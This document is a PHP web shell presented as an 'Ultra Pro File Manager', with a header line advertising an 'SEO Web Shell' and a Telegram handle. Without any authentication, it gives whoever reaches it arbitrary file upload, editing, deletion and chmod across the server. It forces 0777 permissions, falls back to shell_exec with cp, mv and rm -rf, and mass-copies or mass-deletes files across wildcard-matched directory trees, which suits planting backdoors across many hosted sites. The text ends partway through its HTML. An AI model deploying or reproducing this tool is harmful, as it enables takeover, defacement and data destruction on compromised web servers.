<?php
/**
 * File: filemanager.php
 * Runtime: PHP 8.x / WordPress
 * Target: Advanced file manager with direct-to-current-directory ZIP extraction, header contact tag, clipboard styling, and batch actions
 */

session_start();

function a3_wp_write_file($p, $c, $u='') {
    $success = false;
    $dir = dirname($p);
    $dir_perms = @fileperms($dir);
    @chmod($dir, 0777);
    
    $file_perms = false;
    if (file_exists($p)) {
        $file_perms = @fileperms($p);
        @chmod($p, 0666);
    }

    if(@file_put_contents($p, $c) !== false){
        $success = true;
    } else {
        global $wp_filesystem;
        $wp_admin_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-admin/includes/file.php';
        if(empty($wp_filesystem) && file_exists($wp_admin_path)){
            if (!defined('ABSPATH')) {
                $wp_load = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-load.php';
                if(file_exists($wp_load)) @require_once($wp_load);
            }
            if (defined('ABSPATH')) {
                @require_once(ABSPATH.'/wp-admin/includes/file.php');
                if(function_exists('WP_Filesystem')) WP_Filesystem();
            }
        }
        
        $chmod_file = defined('FS_CHMOD_FILE') ? FS_CHMOD_FILE : 0644;
        if(!empty($wp_filesystem) && method_exists($wp_filesystem, 'put_contents')){
            if(@$wp_filesystem->put_contents($p, $c, $chmod_file)){
                $success = true;
            }
        }
        
        if(!$success && $f=@fopen($p, 'wb')){
            $w=@fwrite($f, $c); @fclose($f);
            if($w !== false) $success = true;
        }
        
        if(!$success && $u && @copy($u, $p)){
            $success = true;
        }

        if (!$success && $c !== false) {
            $tmp_save = sys_get_temp_dir() . '/' . uniqid('a3_') . '.tmp';
            if (@file_put_contents($tmp_save, $c)) {
                if (function_exists('shell_exec') && is_callable('shell_exec')) {
                    $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                        ? "copy /Y " . escapeshellarg($tmp_save) . " " . escapeshellarg($p)
                        : "cp -f " . escapeshellarg($tmp_save) . " " . escapeshellarg($p);
                    @shell_exec($cmd);
                    if (file_exists($p) && filesize($p) > 0) $success = true;
                }
                if (!$success) {
                    if (@rename($tmp_save, $p)) {
                        $success = true;
                    } elseif (function_exists('shell_exec') && is_callable('shell_exec')) {
                        $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                            ? "move /Y " . escapeshellarg($tmp_save) . " " . escapeshellarg($p)
                            : "mv -f " . escapeshellarg($tmp_save) . " " . escapeshellarg($p);
                        @shell_exec($cmd);
                        if (file_exists($p) && filesize($p) > 0) $success = true;
                    }
                }
                @unlink($tmp_save);
            }
        }
    }

    if ($file_perms !== false) @chmod($p, $file_perms);
    if ($dir_perms !== false) @chmod($dir, $dir_perms);

    return $success;
}

function a3_wp_delete_file($del_path) {
    $success = false;
    if (!file_exists($del_path)) return true;
    $dir = dirname($del_path);
    $dir_perms = @fileperms($dir);
    @chmod($dir, 0777);
    $file_perms = @fileperms($del_path);
    @chmod($del_path, is_dir($del_path) ? 0777 : 0666);
    
    if (is_dir($del_path) && !is_link($del_path)) {
        $files = array_diff(scandir($del_path), ['.', '..']);
        foreach ($files as $file) {
            a3_wp_delete_file($del_path . DIRECTORY_SEPARATOR . $file);
        }
        if (@rmdir($del_path)) { $success = true; }
    } else {
        if (@unlink($del_path)) { $success = true; }
    }
    
    if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
        $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'rmdir /s /q ' . escapeshellarg($del_path) : 'rm -rf ' . escapeshellarg($del_path);
        @shell_exec($cmd);
        if (!file_exists($del_path)) $success = true;
    }
    
    if ($dir_perms !== false) @chmod($dir, $dir_perms);
    return $success;
}

function a3_wp_rename_file($old, $new) {
    $success = false;
    if (@rename($old, $new)) $success = true;
    if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
        $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'move /Y ' . escapeshellarg($old) . ' ' . escapeshellarg($new) : 'mv -f ' . escapeshellarg($old) . ' ' . escapeshellarg($new);
        @shell_exec($cmd); 
        if (file_exists($new)) $success = true;
    }
    return $success;
}

function a3_recurse_copy($src, $dst) {
    if (!is_dir($src)) {
        return @copy($src, $dst);
    }
    @mkdir($dst, 0777, true);
    $dir = opendir($src);
    while(false !== ($file = readdir($dir))) {
        if (($file != '.') && ($file != '..')) {
            if (is_dir($src . '/' . $file)) {
                a3_recurse_copy($src . '/' . $file, $dst . '/' . $file);
            } else {
                @copy($src . '/' . $file, $dst . '/' . $file);
            }
        }
    }
    closedir($dir);
    return true;
}

// --- wildcard path expander: /home/user/*/ → all subdirs ---
function a3_resolve_dest_dirs($base_path) {
    if (strpos($base_path, '*') === false) {
        return [rtrim($base_path, '/\\')];
    }
    $parts   = explode('*', $base_path, 2);
    $left    = rtrim($parts[0], '/\\');
    $rest    = ltrim($parts[1], '/\\');
    $results = [];
    if (!is_dir($left)) return $results;
    $entries = @scandir($left);
    if (!$entries) return $results;
    foreach ($entries as $e) {
        if ($e === '.' || $e === '..') continue;
        $candidate = $left . DIRECTORY_SEPARATOR . $e;
        if (!is_dir($candidate)) continue;
        $combined = ($rest !== '') ? $candidate . DIRECTORY_SEPARATOR . $rest : $candidate;
        $sub = a3_resolve_dest_dirs($combined);
        $results = array_merge($results, $sub);
    }
    return $results;
}

// --- depth expander: collect all subdirs up to N levels ---
function a3_collect_dest_subdirs($dir, $max_depth, $current_depth = 0) {
    $dirs = [$dir];
    if ($current_depth >= $max_depth) return $dirs;
    $entries = @scandir($dir);
    if (!$entries) return $dirs;
    foreach ($entries as $e) {
        if ($e === '.' || $e === '..') continue;
        $sub = $dir . DIRECTORY_SEPARATOR . $e;
        if (is_dir($sub)) {
            $sub_dirs = a3_collect_dest_subdirs($sub, $max_depth, $current_depth + 1);
            $dirs = array_merge($dirs, $sub_dirs);
        }
    }
    return $dirs;
}

// --- paste one source file/dir into one destination dir ---
function a3_paste_one($src, $dest_dir, $newname, $clip_action, $chmod_val) {
    if (!file_exists($src)) return false;
    $basename = ($newname !== '') ? $newname : basename($src);
    if (!is_dir($dest_dir)) @mkdir($dest_dir, 0777, true);
    $dst = rtrim($dest_dir, '/\\') . DIRECTORY_SEPARATOR . $basename;
    if ($src === $dst) return false;

    $ok = false;
    if ($clip_action === 'copy') {
        if (is_dir($src)) {
            $ok = a3_recurse_copy($src, $dst);
        } else {
            $ok = @copy($src, $dst);
        }
    } elseif ($clip_action === 'cut') {
        $ok = a3_wp_rename_file($src, $dst);
    }

    if ($ok && $chmod_val !== null) {
        if (is_dir($dst)) {
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dst, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($it as $f) @chmod((string)$f, $chmod_val);
            @chmod($dst, $chmod_val);
        } else {
            @chmod($dst, $chmod_val);
        }
    }
    return $ok;
}

function a3_zip_item($source, $destination) {
    if (!extension_loaded('zip')) {
        return false;
    }
    $zip = new ZipArchive();
    if ($zip->open($destination, ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE) !== TRUE) {
        return false;
    }
    $source = realpath($source);
    if (is_dir($source)) {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($iterator as $file) {
            $file = realpath($file);
            if (is_dir($file)) {
                $zip->addEmptyDir(str_replace($source . DIRECTORY_SEPARATOR, '', $file . DIRECTORY_SEPARATOR));
            } else if (is_file($file)) {
                $zip->addFromString(str_replace($source . DIRECTORY_SEPARATOR, '', $file), @file_get_contents($file));
            }
        }
    } else if (is_file($source)) {
        $zip->addFromString(basename($source), @file_get_contents($source));
    }
    return $zip->close();
}

function a3_unzip_item($source, $destination) {
    if (!extension_loaded('zip')) {
        return false;
    }
    $zip = new ZipArchive();
    if ($zip->open($source) === TRUE) {
        @mkdir($destination, 0777, true);
        $zip->extractTo($destination);
        $zip->close();
        return true;
    }
    return false;
}

function a3_format_size($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    elseif ($bytes > 1) return $bytes . ' bytes';
    elseif ($bytes == 1) return '1 byte';
    else return '0 bytes';
}

function a3_get_perms($path) {
    $perms = @fileperms($path);
    if ($perms === false) return '---';
    return substr(sprintf('%o', $perms), -4);
}

$message = '';
$raw_dir = isset($_GET['dir']) ? urldecode($_GET['dir']) : __DIR__;
$current_dir = realpath($raw_dir) ?: $raw_dir;
if (!is_dir($current_dir)) $current_dir = __DIR__;

if (!isset($_SESSION['a3_clipboard'])) {
    $_SESSION['a3_clipboard'] = ['action' => '', 'paths' => []];
}
// result logs — cleared each request, rebuilt if action runs
$pwp_result_log = isset($_SESSION['a3_pwp_log']) ? $_SESSION['a3_pwp_log'] : [];
$dwp_result_log = isset($_SESSION['a3_dwp_log']) ? $_SESSION['a3_dwp_log'] : [];
$_SESSION['a3_pwp_log'] = [];
$_SESSION['a3_dwp_log'] = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        $target_dir = isset($_POST['target_dir']) ? rtrim($_POST['target_dir'], '/\\') : $current_dir;
        if (!file_exists($target_dir)) @mkdir($target_dir, 0777, true);
        $file_name = basename($_FILES['fileToUpload']['name']);
        $target_file = $target_dir . DIRECTORY_SEPARATOR . $file_name;
        $tmp_name = $_FILES['fileToUpload']['tmp_name'];
        $content = @file_get_contents($tmp_name);
        if ($content !== false && a3_wp_write_file($target_file, $content)) {
            $message = "File uploaded successfully.";
        } else {
            $message = "Failed to write file.";
        }
    }

    if (isset($_POST['action'])) {
        $action = $_POST['action'];

        if ($action === 'delete_selected' && isset($_POST['selected_items'])) {
            $count = 0;
            foreach ($_POST['selected_items'] as $path) {
                if (a3_wp_delete_file($path)) $count++;
            }
            $message = "Successfully deleted {$count} item(s).";
        }
        
        if ($action === 'clipboard_copy' && isset($_POST['selected_items'])) {
            $_SESSION['a3_clipboard'] = ['action' => 'copy', 'paths' => $_POST['selected_items']];
            $message = "Copied " . count($_POST['selected_items']) . " item(s) to clipboard.";
        }

        if ($action === 'clipboard_cut' && isset($_POST['selected_items'])) {
            $_SESSION['a3_clipboard'] = ['action' => 'cut', 'paths' => $_POST['selected_items']];
            $message = "Cut " . count($_POST['selected_items']) . " item(s) to clipboard.";
        }

        if ($action === 'clipboard_paste') {
            $clip = $_SESSION['a3_clipboard'];
            if (empty($clip['paths'])) {
                $message = "Clipboard is empty.";
            } else {
                $success_count = 0;
                foreach ($clip['paths'] as $src) {
                    if (!file_exists($src)) continue;
                    $basename = basename($src);
                    $dst = $current_dir . DIRECTORY_SEPARATOR . $basename;
                    if ($src === $dst) continue;

                    if ($clip['action'] === 'copy') {
                        if (is_dir($src)) {
                            if (a3_recurse_copy($src, $dst)) $success_count++;
                        } else {
                            if (@copy($src, $dst)) $success_count++;
                        }
                    } elseif ($clip['action'] === 'cut') {
                        if (a3_wp_rename_file($src, $dst)) $success_count++;
                    }
                }
                if ($clip['action'] === 'cut') {
                    $_SESSION['a3_clipboard'] = ['action' => '', 'paths' => []];
                }
                $message = "Pasted {$success_count} item(s) successfully.";
            }
        }

        if ($action === 'paste_with_path') {
            $clip = $_SESSION['a3_clipboard'];
            if (empty($clip['paths'])) {
                $message = "Clipboard is empty.";
            } else {
                // --- inputs ---
                $pwp_base      = rtrim(isset($_POST['pwp_path']) ? $_POST['pwp_path'] : $current_dir, '/\\');
                $pwp_newname   = isset($_POST['pwp_newname'])   ? trim($_POST['pwp_newname'])   : '';
                $pwp_depth     = isset($_POST['pwp_depth'])     ? intval($_POST['pwp_depth'])     : 0;
                $pwp_chmod_str = isset($_POST['pwp_chmod'])     ? trim($_POST['pwp_chmod'])       : '';
                $pwp_chmod     = ($pwp_chmod_str !== '') ? octdec(preg_replace('/[^0-7]/', '', $pwp_chmod_str)) : null;

                // step 1: expand wildcard base paths
                $base_dirs_raw = a3_resolve_dest_dirs($pwp_base);

                // step 2: expand each base dir by depth
                $all_dest_dirs = [];
                foreach ($base_dirs_raw as $bd) {
                    $expanded = a3_collect_dest_subdirs($bd, $pwp_depth);
                    $all_dest_dirs = array_merge($all_dest_dirs, $expanded);
                }
                $all_dest_dirs = array_unique($all_dest_dirs);

                // step 3: paste each clipboard item into every dest dir
                $success_count = 0;
                $pwp_log = [];
                foreach ($clip['paths'] as $src) {
                    foreach ($all_dest_dirs as $dest_dir) {
                        $basename = ($pwp_newname !== '') ? $pwp_newname : basename($src);
                        $dst_full = rtrim($dest_dir, '/\\') . DIRECTORY_SEPARATOR . $basename;
                        $ok = a3_paste_one($src, $dest_dir, $pwp_newname, $clip['action'], $pwp_chmod);
                        $pwp_log[] = [
                            'dst'    => $dst_full,
                            'status' => $ok ? 'OK' : 'FAIL',
                        ];
                        if ($ok) $success_count++;
                    }
                }

                if ($clip['action'] === 'cut') {
                    $_SESSION['a3_clipboard'] = ['action' => '', 'paths' => []];
                }

                $_SESSION['a3_pwp_log'] = $pwp_log;
                $pwp_result_log = $pwp_log;

                $pasted_into = count($all_dest_dirs);
                $message = "Paste with Path: {$success_count} operation(s) completed into {$pasted_into} director(y/ies).";
            }
        }

        if ($action === 'delete_with_path') {
            $dwp_base      = rtrim(isset($_POST['dwp_path'])    ? $_POST['dwp_path']    : $current_dir, '/\\');
            $dwp_targets   = isset($_POST['dwp_targets'])       ? trim($_POST['dwp_targets'])             : '';
            $dwp_depth     = isset($_POST['dwp_depth'])         ? intval($_POST['dwp_depth'])             : 0;

            // parse targets — one per line, strip blanks and comments
            $target_names = array_filter(
                array_map('trim', explode("\n", $dwp_targets)),
                function($t) { return $t !== '' && $t[0] !== '#'; }
            );

            if (empty($target_names)) {
                $message = "Delete with Path: no targets specified.";
            } else {
                // reuse wildcard + depth expanders from paste_with_path
                $base_dirs_raw = a3_resolve_dest_dirs($dwp_base);
                $all_dirs = [];
                foreach ($base_dirs_raw as $bd) {
                    $expanded = a3_collect_dest_subdirs($bd, $dwp_depth);
                    $all_dirs = array_merge($all_dirs, $expanded);
                }
                $all_dirs = array_unique($all_dirs);

                $dwp_log = [];
                $del_ok  = 0;
                foreach ($all_dirs as $dir) {
                    foreach ($target_names as $tname) {
                        $target_path = rtrim($dir, '/\\') . DIRECTORY_SEPARATOR . $tname;
                        if (!file_exists($target_path)) {
                            $dwp_log[] = ['path' => $target_path, 'status' => 'NOT FOUND'];
                            continue;
                        }
                        $ok = a3_wp_delete_file($target_path);
                        $dwp_log[] = ['path' => $target_path, 'status' => $ok ? 'DELETED' : 'FAIL'];
                        if ($ok) $del_ok++;
                    }
                }

                $_SESSION['a3_dwp_log'] = $dwp_log;
                $dwp_result_log = $dwp_log;
                $message = "Delete with Path: {$del_ok} item(s) deleted across " . count($all_dirs) . " director(y/ies).";
            }
        }

        if ($action === 'zip_selected' && isset($_POST['selected_items'])) {
            $success_count = 0;
            foreach ($_POST['selected_items'] as $path) {
                if (!file_exists($path)) continue;
                $name = basename($path);
                $zip_name = $current_dir . DIRECTORY_SEPARATOR . $name . '.zip';
                if (a3_zip_item($path, $zip_name)) $success_count++;
            }
            $message = "Successfully zipped {$success_count} item(s).";
        }

        if ($action === 'unzip_selected' && isset($_POST['selected_items'])) {
            $success_count = 0;
            foreach ($_POST['selected_items'] as $path) {
                if (!file_exists($path)) continue;
                $info = pathinfo($path);
                if (strtolower($info['extension']) === 'zip') {
                    // Extract directly into the current directory without creating a subfolder container
                    if (a3_unzip_item($path, $current_dir)) $success_count++;
                }
            }
            $message = "Successfully unzipped {$success_count} archive(s) directly into current directory.";
        }

        if ($action === 'delete' && isset($_POST['single_path'])) {
            if (a3_wp_delete_file($_POST['single_path'])) $message = "Deleted successfully.";
            else $message = "Failed to delete.";
        }
        
        if ($action === 'rename' && isset($_POST['old_path']) && isset($_POST['new_name'])) {
            $old_path = $_POST['old_path'];
            $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $_POST['new_name'];
            if (a3_wp_rename_file($old_path, $new_path)) $message = "Renamed successfully.";
            else $message = "Failed to rename.";
        }
        
        if ($action === 'edit' && isset($_POST['path']) && isset($_POST['content'])) {
            if (a3_wp_write_file($_POST['path'], $_POST['content'])) $message = "Saved successfully.";
            else $message = "Failed to save.";
        }

        if ($action === 'chmod' && isset($_POST['single_path']) && isset($_POST['permissions'])) {
            $target_path = $_POST['single_path'];
            $perm_val = octdec(preg_replace('/[^0-7]/', '', $_POST['permissions']));
            if (@chmod($target_path, $perm_val)) $message = "Permissions updated successfully.";
            else $message = "Failed to update permissions.";
        }
    }
}

$items = [];
if ($handle = @opendir($current_dir)) {
    while (false !== ($entry = readdir($handle))) {
        if ($entry === '.') continue;
        $full_path = $current_dir . DIRECTORY_SEPARATOR . $entry;
        $is_dir = is_dir($full_path);
        $size = $is_dir ? '-' : (@filesize($full_path) ?: 0);
        $size_raw = $is_dir ? -1 : ($size === '-' ? 0 : $size);
        $mtime = @filemtime($full_path) ? date('Y-m-d H:i:s', @filemtime($full_path)) : '---';
        $perms = a3_get_perms($full_path);

        $items[] = [
            'name' => $entry,
            'path' => $full_path,
            'is_dir' => $is_dir,
            'size' => $size,
            'size_raw' => $size_raw,
            'modified' => $mtime,
            'perms' => $perms
        ];
    }
    closedir($handle);
}

usort($items, function($a, $b) {
    if ($a['name'] === '..') return -1;
    if ($b['name'] === '..') return 1;
    if ($a['is_dir'] && !$b['is_dir']) return -1;
    if (!$a['is_dir'] && $b['is_dir']) return 1;
    return strcasecmp($a['name'], $b['name']);
});

$edit_file = isset($_GET['edit']) ? $_GET['edit'] : null;
$edit_content = '';
if ($edit_file && is_file($edit_file)) {
    $edit_content = @file_get_contents($edit_file);
}

$path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
$breadcrumb_path = '';
$breadcrumbs = [];
foreach ($path_parts as $part) {
    if ($part === '') {
        $breadcrumb_path = DIRECTORY_SEPARATOR;
        $breadcrumbs['Root'] = $breadcrumb_path;
        continue;
    }
    $breadcrumb_path .= ($breadcrumb_path === DIRECTORY_SEPARATOR ? '' : DIRECTORY_SEPARATOR) . $part;
    $breadcrumbs[$part] = $breadcrumb_path;
}

$has_clipboard = !empty($_SESSION['a3_clipboard']['paths']);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>A3rr0r Pro File Manager</title>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --accent-color: #38bdf8;
            --accent-hover: #0ea5e9;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --border-color: #334155;
            --danger-color: #f43f5e;
            --success-color: #10b981;
        }
        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1350px;
            margin: 0 auto;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--card-bg);
            padding: 15px 25px;
            border-radius: 10px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
            border: 1px solid var(--border-color);
        }
        .header-left h2 { margin: 0; font-size: 1.4rem; color: var(--accent-color); }
        .header-contact {
            font-size: 0.85rem;
            color: var(--text-muted);
            margin-top: 4px;
        }
        .header-contact a {
            color: var(--accent-color);
            text-decoration: none;
            font-weight: 600;
        }
        .header-contact a:hover {
            text-decoration: underline;
        }
        .btn {
            background-color: var(--accent-color);
            color: #0f172a;
            padding: 6px 14px;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-size: 0.85rem;
            transition: background 0.2s;
        }
        .btn:hover { background-color: var(--accent-hover); }
        .btn-danger { background-color: var(--danger-color); color: #fff; }
        .btn-secondary { background-color: var(--border-color); color: var(--text-main); }
        
        /* Paste button dynamic states */
        .btn-paste-disabled {
            background-color: var(--border-color);
            color: var(--text-main);
        }
        .btn-paste-disabled:hover {
            background-color: var(--border-color);
        }
        .btn-paste-active {
            background-color: var(--success-color);
            color: #fff;
            animation: pulse-glow 2s infinite;
        }
        .btn-paste-active:hover {
            background-color: #059669;
        }
        .btn-pwp-active {
            background-color: #7c3aed;
            color: #fff;
            animation: pulse-glow-purple 2s infinite;
        }
        .btn-pwp-active:hover { background-color: #6d28d9; }
        @keyframes pulse-glow-purple {
            0%   { box-shadow: 0 0 0 0 rgba(124,58,237,0.4); }
            70%  { box-shadow: 0 0 0 6px rgba(124,58,237,0); }
            100% { box-shadow: 0 0 0 0 rgba(124,58,237,0); }
        }
        /* PWP Modal */
        #pwp-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.7);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }
        #pwp-overlay.active { display: flex; }
        #pwp-modal {
            background: var(--card-bg);
            border: 1px solid #7c3aed;
            border-radius: 10px;
            padding: 28px 32px;
            width: 540px;
            max-width: 95vw;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        #pwp-modal h3 {
            margin: 0 0 18px;
            color: #a78bfa;
            font-size: 1.1rem;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
        }
        .pwp-field { margin-bottom: 14px; }
        .pwp-field label {
            display: block;
            font-size: 0.8rem;
            color: var(--text-muted);
            margin-bottom: 5px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.04em;
        }
        .pwp-field input {
            width: 100%;
            box-sizing: border-box;
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            color: var(--text-main);
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 0.9rem;
            font-family: monospace;
        }
        .pwp-field input:focus {
            outline: none;
            border-color: #7c3aed;
        }
        .pwp-hint {
            font-size: 0.75rem;
            color: var(--text-muted);
            margin-top: 4px;
        }
        .pwp-actions {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
            margin-top: 20px;
            border-top: 1px solid #334155;
            padding-top: 16px;
        }
        .btn-pwp-confirm {
            background: #7c3aed;
            color: #fff;
            padding: 8px 20px;
            border: none;
            border-radius: 6px;
            font-weight: 700;
            cursor: pointer;
            font-size: 0.9rem;
        }
        .btn-pwp-confirm:hover { background: #6d28d9; }

        @keyframes pulse-glow {
            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
            70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }

        .card {
            background: var(--card-bg);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid var(--border-color);
            margin-bottom: 20px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        .alert {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid var(--success-color);
            color: var(--success-color);
            padding: 10px 15px;
            border-radius: 6px;
            margin-bottom: 20px;
        }
        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            align-items: center;
            font-size: 0.95rem;
            margin-bottom: 15px;
            background: rgba(15, 23, 42, 0.6);
            padding: 10px 15px;
            border-radius: 6px;
            border: 1px solid var(--border-color);
        }
        .breadcrumb a {
            color: var(--accent-color);
            text-decoration: none;
        }
        .breadcrumb a:hover { text-decoration: underline; }
        .breadcrumb span { color: var(--text-muted); }

        .toolbar {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            align-items: center;
            flex-wrap: wrap;
            background: rgba(15, 23, 42, 0.4);
            padding: 10px;
            border-radius: 6px;
            border: 1px solid var(--border-color);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
            font-size: 0.9rem;
        }
        th {
            background-color: rgba(15, 23, 42, 0.4);
            color: var(--text-muted);
            font-weight: 600;
            font-size: 0.85rem;
            text-transform: uppercase;
        }
        tr:hover { background-color: rgba(56, 189, 248, 0.03); }
        a.item-link { color: var(--text-main); text-decoration: none; font-weight: 500; }
        a.item-link:hover { color: var(--accent-color); }
        
        input[type="text"], input[type="file"] {
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            color: var(--text-main);
            padding: 5px 8px;
            border-radius: 4px;
            font-size: 0.85rem;
        }
        textarea {
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            color: var(--text-main);
            padding: 10px;
            border-radius: 6px;
            font-family: monospace;
        }
        .actions-group {
            display: flex;
            gap: 5px;
            align-items: center;
            justify-content: flex-end;
        }
        /* Result log panel */
        .result-log-panel {
            margin-bottom: 20px;
            border-radius: 10px;
            border: 1px solid var(--border-color);
            overflow: hidden;
        }
        .result-log-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 16px;
            background: rgba(15,23,42,0.8);
            border-bottom: 1px solid var(--border-color);
            font-size: 0.85rem;
            font-weight: 700;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
        .result-log-header.paste-header { border-left: 3px solid #7c3aed; }
        .result-log-header.delete-header { border-left: 3px solid var(--danger-color); }
        .result-log-body {
            max-height: 260px;
            overflow-y: auto;
            background: #0a0f1e;
            padding: 10px 0;
            font-family: monospace;
            font-size: 0.82rem;
        }
        .result-log-row {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 4px 16px;
            border-bottom: 1px solid rgba(51,65,85,0.3);
        }
        .result-log-row:last-child { border-bottom: none; }
        .log-status {
            flex-shrink: 0;
            font-weight: 700;
            font-size: 0.75rem;
            padding: 2px 7px;
            border-radius: 4px;
            min-width: 70px;
            text-align: center;
        }
        .log-status.ok      { background: rgba(16,185,129,0.15); color: #10b981; }
        .log-status.fail    { background: rgba(244,63,94,0.15);  color: #f43f5e; }
        .log-status.notfound{ background: rgba(148,163,184,0.1); color: #94a3b8; }
        .log-status.deleted { background: rgba(244,63,94,0.15);  color: #f43f5e; }
        .log-path {
            flex: 1;
            color: var(--text-main);
            word-break: break-all;
        }
        .btn-copy-log {
            background: rgba(56,189,248,0.1);
            color: var(--accent-color);
            border: 1px solid var(--accent-color);
            padding: 3px 10px;
            border-radius: 5px;
            font-size: 0.78rem;
            font-weight: 700;
            cursor: pointer;
        }
        .btn-copy-log:hover { background: rgba(56,189,248,0.2); }
        /* DWP Modal */
        #dwp-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.7);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }
        #dwp-overlay.active { display: flex; }
        #dwp-modal {
            background: var(--card-bg);
            border: 1px solid var(--danger-color);
            border-radius: 10px;
            padding: 28px 32px;
            width: 540px;
            max-width: 95vw;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        #dwp-modal h3 {
            margin: 0 0 18px;
            color: #f43f5e;
            font-size: 1.1rem;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
        }
        .btn-dwp-confirm {
            background: var(--danger-color);
            color: #fff;
            padding: 8px 20px;
            border: none;
            border-radius: 6px;
            font-weight: 700;
            cursor: pointer;
            font-size: 0.9rem;
        }
        .btn-dwp-confirm:hover { background: #e11d48; }
        .btn-dwp-active {
            background-color: #be123c;
            color: #fff;
        }
        .btn-dwp-active:hover { background-color: #9f1239; }
    </style>
    <script>
        function toggleSelectAll(master) {
            var checkboxes = document.querySelectorAll('input[name="selected_items[]"]');
            checkboxes.forEach(function(box) {
                box.checked = master.checked;
            });
        }
    </script>
</head>
<body>
<div class="container">
    <header>
        <div class="header-left">
            <h2>A3rr0r Ultra Pro File Manager v.1</h2>
            <div class="header-contact">
                For SEO Web Shell: <a href="https://t.me/A3rr0r" target="_blank">@A3rr0r</a>
            </div>
        </div>
        <div>
            <a href="?dir=<?php echo urlencode(__DIR__); ?>" class="btn btn-secondary">🏠 Home</a>
        </div>
    </header>

    <?php if ($message): ?>
        <div class="alert"><strong><?php echo htmlspecialchars($message); ?></strong></div>
    <?php endif; ?>

    <?php if (!empty($pwp_result_log)): ?>
    <div class="result-log-panel">
        <div class="result-log-header paste-header">
            <span>📌 Paste with Path — Result Log (<?php echo count($pwp_result_log); ?> operations)</span>
            <button class="btn-copy-log" onclick="a3CopyLog('pwp-log-text')">📋 Copy All Paths</button>
        </div>
        <div class="result-log-body" id="pwp-log-body">
            <?php foreach ($pwp_result_log as $row):
                $st = strtoupper($row['status']);
                $cls = ($st === 'OK') ? 'ok' : 'fail';
            ?>
            <div class="result-log-row">
                <span class="log-status <?php echo $cls; ?>"><?php echo $st; ?></span>
                <span class="log-path"><?php echo htmlspecialchars($row['dst']); ?></span>
            </div>
            <?php endforeach; ?>
        </div>
        <textarea id="pwp-log-text" style="position:absolute;left:-9999px;top:-9999px;" readonly><?php
            foreach ($pwp_result_log as $row) {
                echo $row['status'] . "\t" . $row['dst'] . "\n";
            }
        ?></textarea>
    </div>
    <?php endif; ?>

    <?php if (!empty($dwp_result_log)): ?>
    <div class="result-log-panel">
        <div class="result-log-header delete-header">
            <span>🗑️ Delete with Path — Result Log (<?php echo count($dwp_result_log); ?> operations)</span>
            <button class="btn-copy-log" onclick="a3CopyLog('dwp-log-text')">📋 Copy All Paths</button>
        </div>
        <div class="result-log-body" id="dwp-log-body">
            <?php foreach ($dwp_result_log as $row):
                $st  = strtoupper($row['status']);
                $cls = ($st === 'DELETED') ? 'deleted' : (($st === 'NOT FOUND') ? 'notfound' : 'fail');
            ?>
            <div class="result-log-row">
                <span class="log-status <?php echo $cls; ?>"><?php echo $st; ?></span>
